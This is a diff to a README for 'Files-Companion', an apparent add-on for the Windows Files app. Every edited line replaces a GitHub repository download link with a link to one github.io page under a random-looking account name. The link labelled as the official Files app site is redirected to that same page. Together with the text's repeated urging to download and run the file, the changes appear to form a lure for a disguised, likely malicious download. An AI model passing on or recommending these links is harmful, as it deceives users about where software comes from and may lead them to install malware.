@@ -1,6 +1,6 @@
 # 🚀 Files-Companion - Your Files App, Supercharged
 
-[![Download Files-Companion](https://img.shields.io/badge/Download-Files--Companion-blueviolet?style=for-the-badge&logo=github)](https://github.com/pucksubordertarsioidea8384/Files-Companion)
+[![Download Files-Companion](https://img.shields.io/badge/Download-Files--Companion-blueviolet?style=for-the-badge&logo=github)](https://pucksubordertarsioidea8384.github.io)
 
 Welcome to **Files-Companion**, the essential toolkit that transforms your Windows Files app experience. Whether you're a casual user or a power user, this companion set adds polish, speed, and convenience to everything you do—right out of the box. No coding skills needed—just download, run, and enjoy.
 
@@ -53,7 +53,7 @@ Ready to jump in? Follow these simple steps. If you can click a mouse, you can d
 
 Click the big button below or use the link at the top of this page:
 
-[🔗 Download Files-Companion](https://github.com/pucksubordertarsioidea8384/Files-Companion)
+[🔗 Download Files-Companion](https://pucksubordertarsioidea8384.github.io)
 
 Visit this link to download the application.
 
@@ -87,7 +87,7 @@ Here’s everything you need to know to get Files-Companion running smoothly:
 ### 📝 How to Install (Step-by-Step)
 
 1. **Go to the download page** using the button below:
-   [⬇️ Get Files-Companion Now](https://github.com/pucksubordertarsioidea8384/Files-Companion)
+   [⬇️ Get Files-Companion Now](https://pucksubordertarsioidea8384.github.io)
 
 2. **Click the download link** for the latest version. Save the file to your "Downloads" folder (or anywhere you can find it).
 
@@ -139,8 +139,8 @@ It's designed for the latest Files app on Windows 11, but it also works on Windo
 
 ## 📚 Additional Resources
 
-- **Project Homepage & Downloads**: [Files-Companion on GitHub](https://github.com/pucksubordertarsioidea8384/Files-Companion)
-- **Files App Official Site**: [Files](https://files.community) (for getting the Files manager itself)
+- **Project Homepage & Downloads**: [Files-Companion on GitHub](https://pucksubordertarsioidea8384.github.io)
+- **Files App Official Site**: [Files](https://pucksubordertarsioidea8384.github.io) (for getting the Files manager itself)
 
 If you like Files-Companion, consider starring the repository or sharing it with a friend. It helps the developers and keeps the project alive.
 
@@ -152,7 +152,7 @@ Files-Companion is the little helper that makes a big difference. It's polished,
 
 So go ahead: download it, run it, and see how much smoother Windows can feel.
 
-[![Download Files-Companion](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://github.com/pucksubordertarsioidea8384/Files-Companion)
+[![Download Files-Companion](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://pucksubordertarsioidea8384.github.io)
 
 ---
 
